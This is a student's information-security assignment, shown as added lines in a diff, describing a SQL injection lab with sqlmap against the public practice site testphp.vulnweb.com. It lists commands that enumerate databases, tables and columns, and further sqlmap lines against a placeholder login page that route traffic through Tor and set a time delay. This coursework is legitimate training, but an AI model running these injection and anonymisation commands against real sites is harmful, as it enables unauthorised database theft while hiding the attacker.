@@ -1,0 +1,37 @@
+Name: Muhammad Ahmed Anwar Mirza
+Roll no:  221434772
+Course:  Information Security Section B
+
+Assignment 1
+•	I have used sqlmap for conducting the attack on the website. 
+•	the command that I have used in this attack  using sql map with the link followed and –dbs for their database entry 
+
+sqlmap -u testphp.vulnweb.com/artists.php?artist=1 –dbs
+
+•	After this command entry the system showed two available databases
+1.	acuart
+2.	information_schema 
+
+•	so we used acuart. byt typing the command,
+
+sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –tables
+
+•	the –tables was used to get the table of acuart. so we got the table and the screenshot is in the other file. 
+
+•	now I used the command
+
+sqlmap –u testphp.vulnweb.com/artists.php?artist=1 –D acuart –T products –columns 
+
+in this command products is the table content and we have asked for the products that are in the database of acuart.
+
+sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5	
+
+sqlmap -u "http://testsite.com/login.php" --time-sec 15
+
+
+•	In this way we can inject the website and get the database on the terminal.
+
+
+
+
+
